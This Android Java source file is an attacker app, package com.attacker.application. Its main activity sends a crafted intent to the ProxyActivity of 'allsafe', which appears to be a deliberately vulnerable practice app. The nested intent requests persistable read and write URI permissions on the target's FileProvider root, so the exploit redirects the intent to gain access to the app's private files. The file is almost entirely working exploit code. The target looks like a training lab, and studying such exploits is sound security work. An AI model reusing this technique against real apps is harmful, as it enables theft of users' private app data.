package com.attacker.application;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;

import android.util.Log;
import android.view.View;

import org.apache.commons.io.IOUtils;

import java.io.IOException;
import java.util.Objects;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Log.i(TAG, "MainActivity.onCreate() — ENTER");
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = new Intent();
        Intent extra = new Intent(); extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        extra.setClassName(getPackageName(), "com.attacker.application.AccessProviderActivity"); extra.setData(Uri.parse("content://infosecadventures.allsafe.fileprovider/"));

        intent.setClassName("infosecadventures.allsafe", "infosecadventures.allsafe.ProxyActivity");
        intent.putExtra("extra_intent", extra);
        startActivity(intent);
        Log.i(TAG, "MainActivity.onCreate() — EXIT");

    }
}